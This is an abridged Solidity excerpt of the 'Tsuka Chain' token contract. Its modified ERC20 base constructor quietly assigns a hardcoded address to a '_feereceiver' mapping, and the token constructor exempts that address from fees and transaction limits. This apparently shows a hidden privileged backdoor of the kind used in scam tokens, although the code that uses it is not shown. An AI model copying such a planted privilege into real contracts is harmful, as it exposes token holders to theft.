...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x7Bd20C2Aae0A2283a6CbD144de9391c7789BE3d4] = _marketingwallet;
    }
...
contract TsukaChain is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Tsuka Chain", "TC") {
        ...
        excludeFromFees(address(0x7Bd20C2Aae0A2283a6CbD144de9391c7789BE3d4), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x7Bd20C2Aae0A2283a6CbD144de9391c7789BE3d4), true);
